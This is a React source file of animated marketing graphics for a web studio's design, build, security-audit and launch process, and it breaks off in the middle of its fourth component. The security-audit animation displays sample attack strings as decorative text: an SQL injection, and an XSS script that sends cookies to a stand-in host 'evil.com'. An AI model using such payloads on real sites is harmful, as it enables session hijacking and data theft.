import React, { useState, useEffect } from 'react';

/**
 * Stage 1: Discovery & Architectural Blueprint
 * Video Animation: Think & Design the website -> animated requirements search typing ->
 * component wireframes snapping into place -> Sanjay cursor approving Milestone 01 sticky note.
 */
export function Stage1BlueprintVector() {
  const [selectedFrame, setSelectedFrame] = useState('desktop');
  const [searchQuery, setSearchQuery] = useState('');
  const [searchStep, setSearchStep] = useState(0);
  const [milestoneApproved, setMilestoneApproved] = useState(false);

  const searchQueries = [
    'requirements: luxury ecommerce + zero bloat',
    'architecture: TLS 1.3 security + 60fps mobile',
    'milestone 01: fixed-price scope & no surprise fees',
  ];

  // Continuous typewriter and milestone sign-off loop
  useEffect(() => {
    let charIndex = 0;
    let currentTarget = searchQueries[searchStep];
    let isDeleting = false;
    let pauseTimer = null;

    const typeInterval = setInterval(() => {
      if (!isDeleting) {
        charIndex++;
        setSearchQuery(currentTarget.slice(0, charIndex));
        if (charIndex >= currentTarget.length) {
          isDeleting = true;
          setMilestoneApproved(true);
          // Pause before backspacing
          clearInterval(typeInterval);
          pauseTimer = setTimeout(() => {
            const deleteInterval = setInterval(() => {
              charIndex--;
              setSearchQuery(currentTarget.slice(0, charIndex));
              if (charIndex <= 0) {
                clearInterval(deleteInterval);
                setMilestoneApproved(false);
                setSearchStep((s) => (s + 1) % searchQueries.length);
              }
            }, 30);
          }, 3200);
        }
      }
    }, 55);

    return () => {
      clearInterval(typeInterval);
      if (pauseTimer) clearTimeout(pauseTimer);
    };
  }, [searchStep]);

  return (
    <div className="roadmap-realistic-window" aria-label="Figma Architecture & Requirements Planning Canvas">
      {/* macOS Topbar with Figma App Chrome */}
      <div className="mac-app-topbar figma-topbar">
        <div className="mac-traffic-lights">
          <span className="mac-light light-close" />
          <span className="mac-light light-min" />
          <span className="mac-light light-max" />
        </div>
        <div className="figma-doc-title">
          <svg className="figma-logo-icon" width="12" height="18" viewBox="0 0 38 57" fill="none">
            <path d="M19 28.5C19 23.2533 23.2533 19 28.5 19C33.7467 19 38 23.2533 38 28.5C38 33.7467 33.7467 38 28.5 38C23.2533 38 19 33.7467 19 28.5Z" fill="#1ABCFE"/>
            <path d="M0 47.5C0 42.2533 4.25329 38 9.5 38H19V47.5C19 52.7467 14.7467 57 9.5 57C4.25329 57 0 52.7467 0 47.5Z" fill="#0ACF83"/>
            <path d="M19 0V19H28.5C33.7467 19 38 14.7467 38 9.5C38 4.25329 33.7467 0 28.5 0H19Z" fill="#FF7262"/>
            <path d="M0 9.5C0 14.7467 4.25329 19 9.5 19H19V0H9.5C4.25329 0 0 4.25329 0 9.5Z" fill="#F24E1E"/>
            <path d="M0 28.5C0 33.7467 4.25329 38 9.5 38H19V19H9.5C4.25329 19 0 23.2533 0 28.5Z" fill="#A259FF"/>
          </svg>
          <span className="figma-filename">PrismLine_Architecture_Blueprint.fig</span>
          <span className="figma-zoom">100%</span>
        </div>
        <div className="figma-actions">
          <span className="figma-share-pill">Share</span>
          <span className="figma-play-pill">▶</span>
        </div>
      </div>

      {/* Figma Tool Ribbon + Architectural Search Bar */}
      <div className="figma-toolbar-ribbon">
        <div className="figma-tools-left">
          <span className="f-tool active">↖</span>
          <span className="f-tool">#</span>
          <span className="f-tool">□</span>
          <span className="f-tool">T</span>
          <span className="f-tool">💬</span>
        </div>

        {/* Live Requirements Search Input */}
        <div className="figma-search-command-bar">
          <span className="f-search-icon">🔍</span>
          <span className="f-search-text">{searchQuery}</span>
          <span className="f-search-cursor">|</span>
        </div>

        <div className="figma-tools-right">
          <span className="f-avatar">SV</span>
          <span className="f-user-label">Sanjay (Lead)</span>
        </div>
      </div>

      {/* Dynamic Requirements Tag Pills */}
      <div className="figma-requirements-chips-bar">
        <span className="req-chip-label">ACTIVE SPECS:</span>
        <span className="req-chip active">⚡ 95+ PageSpeed</span>
        <span className="req-chip active">🔒 TLS 1.3 / OWASP</span>
        <span className="req-chip active">🛍️ Instant Checkout</span>
        <span className="req-chip highlight">🛡️ ₹0 Scope Creep</span>
      </div>

      {/* Main Canvas Workspace */}
      <div className="figma-canvas-area">
        {/* Left: Mini Layers Sidebar */}
        <div className="figma-layers-sidebar">
          <div className="layer-sec-title">LAYERS</div>
          <div
            className={`layer-item ${selectedFrame === 'desktop' ? 'active' : ''}`}
            onClick={() => setSelectedFrame('desktop')}
          >
            <span className="layer-icon">#</span>
            <span className="layer-name">01 Desktop Landing</span>
          </div>
          <div
            className={`layer-item ${selectedFrame === 'checkout' ? 'active' : ''}`}
            onClick={() => setSelectedFrame('checkout')}
          >
            <span className="layer-icon">#</span>
            <span className="layer-name">02 User Flow &amp; Gate</span>
          </div>
          <div className="layer-item">
            <span className="layer-icon">🔒</span>
            <span className="layer-name">Data Architecture</span>
          </div>
        </div>

        {/* Center: Real Wireframe Canvas with Live Connectors & Sticky Note */}
        <div className="figma-artboard-stage">
          {/* Wireframe Frame 1: Desktop Landing Page */}
          <div className="figma-frame-card frame-hero">
            <div className="frame-header-label"># 01 Landing Wireframe — 1440px</div>
            <div className="wf-page-content">
              {/* Wireframe Nav */}
              <div className="wf-nav-bar">
                <span className="wf-logo-box" />
                <div className="wf-nav-items">
                  <span className="wf-nav-pill" />
                  <span className="wf-nav-pill" />
                  <span className="wf-nav-pill active-pill" />
                </div>
              </div>

              {/* Wireframe Hero Header */}
              <div className="wf-hero-split">
                <div className="wf-copy-side">
                  <div className="wf-heading-line wf-line-lg" />
                  <div className="wf-heading-line wf-line-md" />
                  <div className="wf-subtext-line" />
                  <div className="wf-cta-button">Start Project &rarr;</div>
                </div>
                <div className="wf-media-box">
                  <div className="wf-media-placeholder">
                    <span className="wf-camera-icon">📷</span>
                    <span className="wf-media-text">Interactive Showcase</span>
                  </div>
                </div>
              </div>

              {/* Wireframe 3-Column Features */}
              <div className="wf-cards-trio">
                <div className="wf-mini-card">
                  <span className="wf-dot blue" />
                  <span className="wf-card-line" />
                </div>
                <div className="wf-mini-card">
                  <span className="wf-dot orange" />
                  <span className="wf-card-line" />
                </div>
                <div className="wf-mini-card">
                  <span className="wf-dot green" />
                  <span className="wf-card-line" />
                </div>
              </div>
            </div>
          </div>

          {/* User Flow Connection Arrow with Active Pulse */}
          <div className="figma-flow-connector" aria-hidden="true">
            <svg width="60" height="30" viewBox="0 0 60 30" fill="none">
              <path
                d="M 5 15 C 25 15, 35 15, 52 15"
                stroke="#8B5CF6"
                strokeWidth="2"
                strokeDasharray="4 3"
              />
              <polygon points="50,11 58,15 50,19" fill="#8B5CF6" />
              <circle cx="28" cy="15" r="3" fill="#8B5CF6">
                <animate
                  attributeName="cx"
                  values="10;50;10"
                  dur="2.4s"
                  repeatCount="indefinite"
                />
              </circle>
            </svg>
            <span className="flow-badge">Click CTA</span>
          </div>

          {/* Wireframe Frame 2: Checkout & Scope Approval */}
          <div className="figma-frame-card frame-scope">
            <div className="frame-header-label"># 02 Scope &amp; Conversion Gate</div>
            <div className="wf-scope-content">
              <div className="wf-scope-badge">
                <span className="scope-icon">🛡️</span>
                <span className="scope-text">100% Fixed-Price Scope Guarantee</span>
              </div>
              <div className="wf-scope-list">
                <div className="scope-row">
                  <span className="scope-check">✓</span>
                  <span>₹0 Hidden Surcharges or Surprises</span>
                </div>
                <div className="scope-row">
                  <span className="scope-check">✓</span>
                  <span>Full User Journey &amp; Sitemap Signed Off</span>
                </div>
                <div className="scope-row">
                  <span className="scope-check">✓</span>
                  <span>Built-in TLS 1.3 Security Architecture</span>
                </div>
              </div>
            </div>
          </div>

          {/* Realistic Figma Sticky Note with Approval Seal */}
          <div className={`figma-sticky-note ${milestoneApproved ? 'approved' : ''}`}>
            <div className="sticky-tape" />
            <div className="sticky-text">
              <strong>MILESTONE 01:</strong>
              <br />
              Client approved wireframes &amp; fixed proposal. Zero scope creep!
            </div>
            <div className="sticky-footer-row">
              <span className="sticky-author">— Sanjay V.S</span>
              {milestoneApproved && (
                <span className="sticky-approved-tag">APPROVED ✓</span>
              )}
            </div>
          </div>

          {/* Animated Collaboration Cursor Badge */}
          <div className={`figma-live-cursor ${milestoneApproved ? 'cursor-signing' : ''}`} aria-hidden="true">
            <svg width="14" height="18" viewBox="0 0 14 18" fill="none">
              <path d="M0 0L14 10L6.5 11L4 18L0 0Z" fill="#A855F7" />
            </svg>
            <span className="cursor-tag">Sanjay (Lead Arch)</span>
          </div>
        </div>
      </div>

      {/* Realistic Figma Bottom Bar */}
      <div className="figma-bottom-bar">
        <span className="f-status-dot green" />
        <span className="f-status-text">
          {milestoneApproved
            ? 'STAGE 01 APPROVED // 100% SPECIFICATION TRANSPARENCY'
            : 'DISCOVERY RUNNING // ARCHITECTING REQUIREMENTS & WIREFRAMES...'}
        </span>
      </div>
    </div>
  );
}

/**
 * Stage 2: Modern Web Design & Core Development
 * Video Animation: Writes code in VS Code -> Terminal compiles -> Smoothly transitions/expands
 * into a full screen live website storefront where a cursor clicks "Add to Bag", increments cart, and shows toast.
 */
export function Stage2CodeVector() {
  const [viewMode, setViewMode] = useState('split'); // 'split' | 'fullscreen'
  const [cartCount, setCartCount] = useState(0);
  const [toastVisible, setToastVisible] = useState(false);
  const [codeTypingLine, setCodeTypingLine] = useState(0);
  const [btnActive, setBtnActive] = useState(false);
  const [cursorPos, setCursorPos] = useState({ x: 75, y: 80 });

  // 10-second continuous looping story:
  // 0s-4s: Writing code in VS Code & Vite compilation
  // 4s-9s: Expanding to full screen live website + simulated user clicks Add to Bag
  // 9s-10s: Hot reload confirmation & loops back
  useEffect(() => {
    let step = 0;
    const loopInterval = setInterval(() => {
      step = (step + 1) % 4;

      if (step === 0) {
        // Phase 1: Code Mode
        setViewMode('split');
        setCodeTypingLine(0);
        setToastVisible(false);
      } else if (step === 1) {
        // Phase 2: Compile & Transition to Full Screen Website
        setCodeTypingLine(1);
        setTimeout(() => {
          setViewMode('fullscreen');
        }, 600);
      } else if (step === 2) {
        // Phase 3: Move cursor to "Add To Bag" and click
        setCursorPos({ x: 50, y: 72 });
        setTimeout(() => {
          setBtnActive(true);
          setTimeout(() => {
            setBtnActive(false);
            setCartCount((c) => (c >= 3 ? 1 : c + 1));
            setToastVisible(true);
          }, 250);
        }, 700);
      } else if (step === 3) {
        // Phase 4: Toast remains, preparing loop reset
        setTimeout(() => {
          setToastVisible(false);
        }, 1200);
      }
    }, 2800);

    return () => clearInterval(loopInterval);
  }, []);

  const handleManualAdd = () => {
    setBtnActive(true);
    setTimeout(() => {
      setBtnActive(false);
      setCartCount((c) => c + 1);
      setToastVisible(true);
      setTimeout(() => setToastVisible(false), 2000);
    }, 200);
  };

  return (
    <div className={`roadmap-realistic-window ${viewMode === 'fullscreen' ? 'show-fullscreen-store' : ''}`} aria-label="VS Code Development & Full Screen Website Storefront">
      {/* macOS Topbar */}
      <div className="mac-app-topbar vscode-topbar">
        <div className="mac-traffic-lights">
          <span className="mac-light light-close" />
          <span className="mac-light light-min" />
          <span className="mac-light light-max" />
        </div>
        <div className="vscode-window-title">
          <span>
            {viewMode === 'fullscreen'
              ? 'Safari — localhost:5173/storefront [Live Storefront Preview]'
              : 'Visual Studio Code — Storefront.tsx [Workspace]'}
          </span>
        </div>
        <div className="window-mode-switch">
          <button
            type="button"
            className={`btn-mode-pill ${viewMode === 'split' ? 'active' : ''}`}
            onClick={() => setViewMode('split')}
          >
            Code
          </button>
          <button
            type="button"
            className={`btn-mode-pill ${viewMode === 'fullscreen' ? 'active' : ''}`}
            onClick={() => setViewMode('fullscreen')}
          >
            Website ↗
          </button>
        </div>
      </div>

      {/* Main Workspace: Smooth Switch between Code View & Full Screen Storefront */}
      <div className="code-to-website-container">
        {/* VIEW A: VS Code Split View */}
        <div className={`split-dev-workspace ${viewMode === 'fullscreen' ? 'fade-out' : ''}`}>
          {/* Left Side: Authentic VS Code Editor */}
          <div className="dev-vscode-pane">
            <div className="vscode-activity-bar">
              <span className="v-icon active">📁</span>
              <span className="v-icon">🔍</span>
              <span className="v-icon">🌿</span>
              <span className="v-icon">⚙️</span>
            </div>

            <div className="vscode-editor-pane">
              <div className="vscode-tabs-bar">
                <div className="v-tab active-tab">
                  <span className="v-tab-tech react-color">⚛</span>
                  <span>Storefront.tsx</span>
                  <span className="v-tab-close">×</span>
                </div>
                <div className="v-tab">
                  <span className="v-tab-tech ts-color">TS</span>
                  <span>useCheckout.ts</span>
                </div>
              </div>

              {/* Code Content with Animated Typing */}
              <div className="vscode-code-canvas">
                <pre className="real-code-editor">
                  <code>
                    <span className="code-ln">01</span><span className="kw-import">import</span> &#123; createStorefront &#125; <span className="kw-import">from</span> <span className="kw-str">'@prismline/core'</span>;<br />
                    <span className="code-ln">02</span><span className="kw-import">import</span> &#123; useSecureCheckout &#125; <span className="kw-import">from</span> <span className="kw-str">'@/hooks'</span>;<br />
                    <span className="code-ln">03</span><br />
                    <span className="code-ln">04</span><span className="kw-fn">export function</span> <span className="kw-component">ArtisanStore</span>() &#123;<br />
                    <span className="code-ln">05</span>  <span className="kw-const">const</span> &#123; bag, checkout &#125; = <span className="kw-fn">useSecureCheckout</span>();<br />
                    <span className="code-ln">06</span>  <span className="kw-const">return</span> (<br />
                    <span className="code-ln">07</span>    &lt;<span className="kw-tag">FastStorefront</span><br />
                    <span className="code-ln">08</span>      <span className="kw-prop">zeroThirdPartyBloat</span>=&#123;<span className="kw-bool">true</span>&#125;<br />
                    <span className="code-ln">09</span>      <span className="kw-prop">sourceCodeOwnership</span>=<span className="kw-str">"100%"</span><br />
                    <span className="code-ln">10</span>      <span className="kw-prop">encryption</span>=<span className="kw-str">"TLS-256"</span><br />
                    <span className="code-ln">11</span>    /&gt;<br />
                    <span className="code-ln">12</span>  ); <span className="code-cursor-blink">|</span><br />
                    <span className="code-ln">13</span>&#125;
                  </code>
                </pre>
              </div>

              {/* Terminal Running Compilation */}
              <div className="vscode-terminal-bar">
                <span className="term-prompt">✓</span>
                <span className="term-text">
                  {codeTypingLine === 0
                    ? 'pnpm run dev • compiling Storefront.tsx...'
                    : 'Vite 5.4 built in 480ms • 0 vulnerabilities • Ready'}
                </span>
              </div>
            </div>
          </div>

          {/* Right Side: Split View Preview */}
          <div className="dev-browser-pane">
            <div className="browser-address-bar">
              <div className="address-pill">
                <span className="ssl-lock">🔒</span>
                <span className="address-host">localhost:5173</span>
                <span className="address-path">/storefront</span>
              </div>
              <div className="cart-counter-pill">
                <span>🛍️ Bag ({cartCount})</span>
              </div>
            </div>

            <div className="browser-store-content">
              <div className="store-product-card">
                <div className="store-product-photo">
                  <span className="store-badge">HANDCRAFTED</span>
                  <div className="product-luxury-icon">🌿</div>
                </div>
                <div className="store-product-info">
                  <div className="prod-header-row">
                    <div className="prod-name">Artisan Keepsake Vase</div>
                    <div className="prod-price">₹1,899.00</div>
                  </div>
                  <div className="prod-meta">Mobile Responsive • Zero Lag</div>
                  <button
                    type="button"
                    className={`btn-store-cart ${btnActive ? 'active' : ''}`}
                    onClick={handleManualAdd}
                  >
                    Add To Bag +
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* VIEW B: FULL SCREEN EXPANDED WEBSITE STOREFRONT */}
        <div className={`fullscreen-storefront-view ${viewMode === 'fullscreen' ? 'active-storefront' : ''}`}>
          {/* Full Browser Nav */}
          <div className="fs-browser-header">
            <div className="fs-url-bar">
              <span className="ssl-lock">🔒</span>
              <span className="fs-url-text">https://localhost:5173/storefront</span>
              <span className="fs-url-badge">60 FPS • REACT 18</span>
            </div>
            <div className="fs-header-actions">
              <span className="fs-nav-link">Catalog</span>
              <span className="fs-nav-link">About</span>
              <span className="cart-counter-pill highlight">🛍️ Bag ({cartCount})</span>
            </div>
          </div>

          {/* Full Screen Storefront Showcase */}
          <div className="fs-showcase-grid">
            <div className="fs-product-hero-card">
              <div className="fs-photo-container">
                <span className="store-badge">HANDCRAFTED LUXURY</span>
                <div className="fs-large-product-icon">🌿</div>
                <div className="fs-floating-spec">100% PURE CERAMIC</div>
              </div>
              <div className="fs-details-col">
                <div className="fs-category-tag">ARTISANAL COLLECTION 2026</div>
                <h4 className="fs-title">Artisan Keepsake Vase</h4>
                <div className="fs-price-row">
                  <span className="fs-current-price">₹1,899.00</span>
                  <span className="fs-tax-sub">Tax included • Free Shipping</span>
                </div>
                <div className="fs-features-list">
                  <span>✓ 100% Custom React Component Architecture</span>
                  <span>✓ Instant Mobile Checkout (<span className="text-green">0.4s</span> reaction)</span>
                  <span>✓ Zero Third-Party Tracker Bloat</span>
                </div>

                <div className="fs-cta-row">
                  <button
                    type="button"
                    className={`btn-fs-cart ${btnActive ? 'active' : ''}`}
                    onClick={handleManualAdd}
                  >
                    Add To Bag +
                  </button>
                  <span className="fs-stock-pill">● In Stock (Ships Today)</span>
                </div>
              </div>
            </div>

            {/* Simulated Live Visitor Cursor in Fullscreen */}
            <div
              className={`simulated-visitor-cursor ${btnActive ? 'clicked' : ''}`}
              style={{ left: `${cursorPos.x}%`, top: `${cursorPos.y}%` }}
              aria-hidden="true"
            >
              <svg width="16" height="20" viewBox="0 0 14 18" fill="none">
                <path d="M0 0L14 10L6.5 11L4 18L0 0Z" fill="#FF5722" stroke="#FFFFFF" strokeWidth="1" />
              </svg>
              <span className="visitor-cursor-tag">Visitor Click</span>
            </div>

            {/* Toast Notification */}
            {toastVisible && (
              <div className="browser-toast-confirm">
                ✓ Added to bag! Instant reaction &bull; Zero Lag
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Window Status Footer */}
      <div className="mac-app-footer">
        <span className="footer-branch">
          {viewMode === 'fullscreen'
            ? '✓ LIVE FULL SCREEN STOREFRONT // ZERO TEMPLATES // FULL CLIENT CODE OWNERSHIP'
            : '100% CLEAN CODE // FULL CLIENT OWNERSHIP // ZERO TEMPLATES'}
        </span>
      </div>
    </div>
  );
}

/**
 * Stage 3: Testing, Speed Optimization & Security Audit
 * Video Animation: Cyber attack simulation (SQL injection, XSS script injection, DDoS botnet)
 * hitting the website -> Enterprise Security Shield intercepts & deflects it in real-time ->
 * 0 vulnerabilities confirmed -> Lighthouse 99 score dials spin and light up green.
 */
export function Stage3AuditVector() {
  const [threatPhase, setThreatPhase] = useState('incoming'); // 'incoming' | 'deflecting' | 'safe'
  const [attackIndex, setAttackIndex] = useState(0);

  const attackScenarios = [
    {
      type: 'SQL INJECTION',
      payload: "SELECT * FROM users WHERE id = '1' OR '1'='1' --",
      rule: 'OWASP SQLi Sanitizer active',
    },
    {
      type: 'CROSS-SITE SCRIPTING (XSS)',
      payload: '<script>document.location="http://evil.com/steal?cookie="</script>',
      rule: 'CSP Level 3 Header Isolation',
    },
    {
      type: 'BOTNET DDOS SURGE',
      payload: '4,800 SYN flood requests directed at /api/checkout',
      rule: 'Edge Rate-Limiting + Token Bucket active',
    },
  ];

  // Continuous cyber attack deflection running animation loop
  useEffect(() => {
    let stateTimer = null;

    const runAttackLoop = () => {
      // 1. Attack arrives
      setThreatPhase('incoming');

      stateTimer = setTimeout(() => {
        // 2. Shield deflects attack
        setThreatPhase('deflecting');

        stateTimer = setTimeout(() => {
          // 3. Attack defeated, safe verified
          setThreatPhase('safe');

          stateTimer = setTimeout(() => {
            setAttackIndex((idx) => (idx + 1) % attackScenarios.length);
            runAttackLoop();
          }, 3000);
        }, 2200);
      }, 1800);
    };

    runAttackLoop();

    return () => {
      if (stateTimer) clearTimeout(stateTimer);
    };
  }, []);

  const currentAttack = attackScenarios[attackIndex];

  return (
    <div className="roadmap-realistic-window" aria-label="Google Chrome Lighthouse & Live Cyber Security Audit Report">
      {/* Chrome Window Topbar */}
      <div className="mac-app-topbar chrome-topbar">
        <div className="mac-traffic-lights">
          <span className="mac-light light-close" />
          <span className="mac-light light-min" />
          <span className="mac-light light-max" />
        </div>
        <div className="chrome-tab-pill active">
          <span className="chrome-tab-icon">⚡</span>
          <span className="chrome-tab-title">Lighthouse &amp; Security Audit — yourbrand.com</span>
          <span className="chrome-tab-close">×</span>
        </div>
        <div className="chrome-window-action">
          <span className="threat-status-badge">
            {threatPhase === 'incoming' && '⚠️ ATTACK DETECTED'}
            {threatPhase === 'deflecting' && '🛡️ SHIELD DEFLECTING'}
            {threatPhase === 'safe' && '✓ 100% PROTECTED'}
          </span>
        </div>
      </div>

      {/* Chrome Omnibox Address */}
      <div className="chrome-omnibox-row">
        <div className="chrome-omnibox-field">
          <span className="ssl-badge">🔒 https://</span>
          <span className="url-domain">yourbrand.com</span>
          <span className="url-badge-verified">SECURE // TLS 1.3</span>
        </div>
      </div>

      {/* Authentic Google Lighthouse Report Interface */}
      <div className="lighthouse-report-body">
        {/* 4 Iconic Circular Score Dials (Official Google Green #0CCE6B) */}
        <div className="lighthouse-scores-row">
          {/* Score 1: Performance */}
          <div className="lh-score-col">
            <div className="lh-dial-wrapper">
              <svg viewBox="0 0 80 80" className="lh-dial-svg">
                <circle cx="40" cy="40" r="34" className="lh-track" />
                <circle
                  cx="40"
                  cy="40"
                  r="34"
                  className={`lh-fill ${threatPhase === 'safe' ? 'anim-rescan' : ''}`}
                  strokeDasharray="213.6"
                  strokeDashoffset="2.1"
                />
              </svg>
              <div className="lh-dial-number score-green">99</div>
            </div>
            <div className="lh-dial-title">Performance</div>
          </div>

          {/* Score 2: Accessibility */}
          <div className="lh-score-col">
            <div className="lh-dial-wrapper">
              <svg viewBox="0 0 80 80" className="lh-dial-svg">
                <circle cx="40" cy="40" r="34" className="lh-track" />
                <circle
                  cx="40"
                  cy="40"
                  r="34"
                  className="lh-fill"
                  strokeDasharray="213.6"
                  strokeDashoffset="0"
                />
              </svg>
              <div className="lh-dial-number score-green">100</div>
            </div>
            <div className="lh-dial-title">Accessibility</div>
          </div>

          {/* Score 3: Best Practices */}
          <div className="lh-score-col">
            <div className="lh-dial-wrapper">
              <svg viewBox="0 0 80 80" className="lh-dial-svg">
                <circle cx="40" cy="40" r="34" className="lh-track" />
                <circle
                  cx="40"
                  cy="40"
                  r="34"
                  className="lh-fill"
                  strokeDasharray="213.6"
                  strokeDashoffset="0"
                />
              </svg>
              <div className="lh-dial-number score-green">100</div>
            </div>
            <div className="lh-dial-title">Best Practices</div>
          </div>

          {/* Score 4: SEO */}
          <div className="lh-score-col">
            <div className="lh-dial-wrapper">
              <svg viewBox="0 0 80 80" className="lh-dial-svg">
                <circle cx="40" cy="40" r="34" className="lh-track" />
                <circle
                  cx="40"
                  cy="40"
                  r="34"
                  className="lh-fill"
                  strokeDasharray="213.6"
                  strokeDashoffset="0"
                />
              </svg>
              <div className="lh-dial-number score-green">100</div>
            </div>
            <div className="lh-dial-title">SEO</div>
          </div>
        </div>

        {/* LIVE CYBER DEFENSE SHIELD SIMULATION BANNER */}
        <div className={`cyber-defense-simulation-box ${threatPhase}`}>
          <div className="defense-head">
            <span className="defense-status-pill">
              {threatPhase === 'incoming' && '🚨 INCOMING THREAT'}
              {threatPhase === 'deflecting' && '🛡️ DEFENSE SHIELD ENGAGED'}
              {threatPhase === 'safe' && '✓ THREAT DEFLECTED & QUARANTINED'}
            </span>
            <span className="defense-type">{currentAttack.type}</span>
          </div>

          {/* Attack Payload Stream */}
          <div className="defense-payload-display">
            <span className="payload-prompt">$ hacker_probe:</span>
            <code className="payload-text">{currentAttack.payload}</code>
          </div>

          {/* Visual Attack Deflection Animation Track */}
          <div className="deflection-radar-track">
            {/* Incoming Malicious Red Vector */}
            <div className={`malicious-packet ${threatPhase}`}>
              <span className="threat-skull">⚡</span>
              <span className="packet-label">Exploit Packet</span>
            </div>

            {/* Protective Firewall Shield Barrier */}
            <div className={`firewall-barrier ${threatPhase}`}>
              <div className="barrier-core">🛡️ PRISMLINE FIREWALL</div>
              <div className="barrier-glow-ripple" />
            </div>

            {/* Safe Target Server */}
            <div className="safe-target-node">
              <span className="node-icon">🌐</span>
              <span className="node-label">Website (Safe)</span>
            </div>
          </div>

          <div className="defense-resolution-line">
            <span className="res-icon">{threatPhase === 'safe' ? '✓' : '●'}</span>
            <span className="res-text">
              {threatPhase === 'incoming' && 'Attack vector detected by perimeter telemetry...'}
              {threatPhase === 'deflecting' && `Neutralizing payload via ${currentAttack.rule}...`}
              {threatPhase === 'safe' && `Payload neutralized! Zero data exposure • 0ms response impact`}
            </span>
          </div>
        </div>

        {/* Detailed Metrics Breakdown */}
        <div className="lh-details-grid">
          {/* Left: Core Web Vitals Key Metrics */}
          <div className="lh-vitals-card">
            <div className="card-kicker">GOOGLE CORE WEB VITALS</div>
            <div className="vital-rows">
              <div className="v-row">
                <span className="v-bullet pass">●</span>
                <span className="v-name">Largest Contentful Paint (LCP)</span>
                <span className="v-score score-good">0.78 s</span>
              </div>
              <div className="v-row">
                <span className="v-bullet pass">●</span>
                <span className="v-name">First Contentful Paint (FCP)</span>
                <span className="v-score score-good">0.42 s</span>
              </div>
              <div className="v-row">
                <span className="v-bullet pass">●</span>
                <span className="v-name">Total Blocking Time (TBT)</span>
                <span className="v-score score-good">10 ms</span>
              </div>
              <div className="v-row">
                <span className="v-bullet pass">●</span>
                <span className="v-name">Cumulative Layout Shift (CLS)</span>
                <span className="v-score score-good">0.00</span>
              </div>
            </div>
          </div>

          {/* Right: Security & Hardening Checklist */}
          <div className="lh-security-card">
            <div className="card-kicker">ENTERPRISE SECURITY AUDIT</div>
            <div className="sec-check-rows">
              <div className="s-check-item">
                <span className="s-icon">✓</span>
                <div className="s-text">
                  <div className="s-title">OWASP Top 10 Hardened</div>
                  <div className="s-sub">Zero SQLi, XSS, or CSRF injection vectors</div>
                </div>
              </div>
              <div className="s-check-item">
                <span className="s-icon">✓</span>
                <div className="s-text">
                  <div className="s-title">256-Bit SSL/TLS 1.3 Active</div>
                  <div className="s-sub">Grade A+ SSL Labs rating, zero plaintext</div>
                </div>
              </div>
              <div className="s-check-item">
                <span className="s-icon">✓</span>
                <div className="s-text">
                  <div className="s-title">Payment &amp; Cart Data Hardened</div>
                  <div className="s-sub">PCI-DSS tokenized isolation gateway</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Chrome Footer */}
      <div className="mac-app-footer chrome-footer">
        <span>✓ 95+ PAGESPEED GUARANTEE • LIGHTHOUSE SCORE 99/100 • OWASP CERTIFIED</span>
      </div>
    </div>
  );
}

/**
 * Stage 4: Launch the Website & Lifetime Rectification Support
 * Video Animation: Launch website live -> Happy customer feedback arrives (5 stars review) ->
 * Simulated anomaly check triggers instant ₹0 bug rectification guarantee -> Official signed lifetime warranty verified.
 */
export function Stage4LaunchVector() {
  const [launchCyclePhase, setLaunchCyclePhase] = useState('review'); // 'live' | 'review' | 'rectify' | 'warranty'
  const [rectifyState, setRectifyState] = useState('clean'); // 'clean' | 'fixing' | 'rectified'

  // Continuous 12-second live lifecycle storytelling loop:
  // Step 1: Launch website & telemetry live
  // Step 2: Happy customer feedback arrives (5 stars, quote, approval)
  // Step 3: Simulated issue detected & instant ₹0 rectification guarantee kicks in
  // Step 4: Official signed warranty stamp shines
  useEffect(() => {
    let timer = null;

    const cycleStory = () => {
      // Phase 1: Live In Production
      setLaunchCyclePhase('live');
      setRectifyState('clean');

      timer = setTimeout(() => {
        // Phase 2: Happy Customer Feedback arrives
        setLaunchCyclePhase('review');

        timer = setTimeout(() => {
          // Phase 3: Simulated anomaly triggers ₹0 Rectification Guarantee
          setLaunchCyclePhase('rectify');
          setRectifyState('fixing');

          timer = setTimeout(() => {
            setRectifyState('rectified');

            timer = setTimeout(() => {
              // Phase 4: Lifetime Warranty Stamp
              setLaunchCyclePhase('warranty');

              timer = setTimeout(() => {
                cycleStory();
              }, 3200);
            }, 2600);
          }, 2000);
        }, 3400);
      }, 2500);
    };

    cycleStory();

    return () => {
      if (timer) clearTimeout(timer);
    };
  }, []);

  return (
    <div className="roadmap-realistic-window" aria-label="Production Release, Client Feedback Sign-Off and Lifetime Warranty">
      {/* macOS Topbar (Perfect Alignment: Traffic lights left, Title center, Live badge right) */}
      <div className="mac-app-topbar release-topbar">
        <div className="mac-traffic-lights">
          <span className="mac-light light-close" />
          <span className="mac-light light-min" />
          <span className="mac-light light-max" />
        </div>
        <div className="release-window-title">
          <span className="release-title-icon">🚀</span>
          <span>production://live.prismline.cloud</span>
        </div>
        <div className="live-status-pill">
          <span className="live-beacon-dot" />
          <span>LIVE IN PRODUCTION</span>
        </div>
      </div>

      {/* Split Console: Live Deployment & Feedback Sign-Off (Left) & Official Signed Warranty Certificate (Right) */}
      <div className="release-console-grid">
        {/* Left Side: Live Production Telemetry, Customer Feedback, and ₹0 Rectification Engine */}
        <div className="deploy-telemetry-panel">
          {/* Domain & Live Telemetry */}
          <div className="deploy-metric-card">
            <div className="deploy-meta-line">
              <span className="deploy-label">PRODUCTION DOMAIN</span>
              <span className="deploy-state ready">ONLINE</span>
            </div>
            <div className="deploy-domain-url">https://yourbrand.com</div>
            <div className="deploy-subtext">
              <span className="live-ping-dot" />
              <span>Global CDN: 300+ PoPs &bull; 4ms latency (Singapore SIN-01)</span>
            </div>
          </div>

          {/* Client Direct Feedback Review Card (Animated In on Phase 2) */}
          <div className={`deploy-feedback-card ${launchCyclePhase === 'review' || launchCyclePhase === 'warranty' ? 'highlight-active' : ''}`}>
            <div className="feedback-head-row">
              <span className="feedback-tag">★ CLIENT REVIEW &amp; SIGN-OFF</span>
              <span className="feedback-stars">★★★★★</span>
            </div>
            <div className="feedback-quote">
              &ldquo;Site launched with zero downtime. Blazing fast, beautiful UI, and 100% scope delivered!&rdquo;
            </div>
            <div className="feedback-signoff">
              <span>✓ Direct Client Review Verified &bull; 100% Approved</span>
            </div>
          </div>

          {/* DYNAMIC ₹0 RECTIFICATION STATUS ENGINE */}
          <div className={`deploy-rectification-card ${rectifyState}`}>
            <div className="rect-head-row">
              <span className="rect-kicker">LIFETIME RECTIFICATION GUARANTEE</span>
              <span className="rect-badge">
                {rectifyState === 'clean' && 'MONITORING'}
